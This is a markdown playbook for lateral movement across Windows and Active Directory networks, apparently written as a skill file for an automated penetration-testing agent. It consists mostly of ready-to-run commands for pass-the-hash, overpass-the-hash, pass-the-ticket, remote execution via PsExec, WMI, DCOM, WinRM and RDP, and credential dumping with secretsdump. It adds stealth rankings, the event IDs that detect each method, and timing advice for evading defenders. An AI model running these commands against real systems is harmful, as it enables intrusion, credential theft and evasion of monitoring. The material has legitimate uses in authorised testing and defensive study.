# Lateral Movement

tags: lateral-movement, psexec, wmi, winrm, rdp, dcom, smb, pass-the-hash, overpass-the-hash, ssh, nxc, impacket

## Objective
Move between hosts using obtained credentials to expand access across the environment.

## Prerequisites
- Valid credential (plaintext, NTLM hash, Kerberos ticket)
- Network access to target host on required ports
- Knowledge of target host services (from graph)

## Methodology

### Execution Methods Reference

| Technique | Command | OPSEC | Ports | Prerequisites |
|-----------|---------|-------|-------|---------------|
| PsExec | `impacket-psexec -hashes ':HASH' 'dom/user@TARGET'` | 0.8 | 445 | Admin + ADMIN$ |
| WMIExec | `impacket-wmiexec -hashes ':HASH' 'dom/user@TARGET'` | 0.5 | 135+high | Admin + DCOM |
| WinRM | `evil-winrm -i TARGET -u user -H HASH` | 0.4 | 5985 | Remote Mgmt Users or admin |
| DCOM | `impacket-dcomexec -hashes ':HASH' 'dom/user@TARGET'` | 0.5 | 135+high | Admin + DCOM |
| RDP | `xfreerdp /v:TARGET /u:user /pth:HASH /cert:ignore` | 0.3 | 3389 | Restricted admin mode |
| SSH | `ssh user@TARGET` | 0.2 | 22 | SSH credentials |

**Decision logic**: SSH > WinRM > WMIExec > DCOM > PsExec (ordered by stealth). Use the least noisy method available.

### Pass-the-Hash
```bash
# nxc for mass validation (OPSEC: 0.5)
nxc smb TARGETS -u user -H NTHASH -d DOMAIN

# impacket for execution
impacket-psexec DOMAIN/user@TARGET -hashes :NTHASH
impacket-wmiexec DOMAIN/user@TARGET -hashes :NTHASH
```
Only **RID-500 Administrator** and domain accounts work for PTH by default (UAC Remote Restrictions). Exception: `LocalAccountTokenFilterPolicy=1`.

### Overpass-the-Hash (OPSEC: 0.3)
```bash
# Convert NTLM hash to Kerberos TGT — looks more legitimate
impacket-getTGT -hashes ':NTHASH' DOMAIN/user
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass DOMAIN/user@TARGET_FQDN

# Even stealthier with AES key
impacket-getTGT -aesKey AES256_KEY DOMAIN/user
```

### Pass-the-Ticket
```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass DOMAIN/user@TARGET_FQDN
impacket-wmiexec -k -no-pass DOMAIN/user@TARGET_FQDN
```

### WinRM with Evil-WinRM
```bash
# Password auth
evil-winrm -i TARGET -u user -p 'pass'

# Hash auth
evil-winrm -i TARGET -u user -H NTHASH

# With Kerberos
evil-winrm -i TARGET -r DOMAIN
```

### RDP
```bash
# Standard RDP
xfreerdp /v:TARGET /u:user /p:'pass' /cert:ignore /dynamic-resolution

# Pass-the-hash RDP (requires restricted admin mode)
xfreerdp /v:TARGET /u:user /pth:NTHASH /cert:ignore
```

### Post-Movement
On each new host:
```bash
# Dump local credentials
impacket-secretsdump DOMAIN/user:pass@TARGET

# Check sessions
nxc smb TARGET -u user -p pass --sessions
```
- Report new HAS_SESSION and ADMIN_TO edges
- Enumerate local shares and files
- Check for additional credentials

## Graph Reporting
- **HAS_SESSION edges**: for confirmed access on new hosts
- **ADMIN_TO edges**: for confirmed admin access
- **Credential nodes**: from credential dumping on new hosts
- **RUNS edges**: for newly discovered services on accessed hosts

## OPSEC Notes

| Technique | Noise Rating | Detection |
|-----------|-------------|-----------|
| PsExec | 0.8 | Event 7045 (service creation) |
| WMIExec | 0.5 | Event 4688 (wmiprvse.exe child) |
| WinRM | 0.4 | Event 91 (WSMan session) |
| DCOM | 0.5 | Event 4688 (mmc.exe/excel.exe child) |
| RDP | 0.3 | Event 4624 Type 10 |
| SSH | 0.2 | auth.log entry |
| Overpass-the-Hash | 0.3 | Normal Kerberos auth pattern |

- Consider time of day — lateral movement during business hours blends better
- WMI/DCOM use dynamic ports — may be blocked by host firewalls

## Sequencing
- **After**: Credential Dumping, Kerberos Attacks, Password Spraying, NTLM Relay
- **Feeds →**: further Credential Dumping on new hosts, Pivoting, Data Exfiltration
- Repeat cycle: move → dump → move
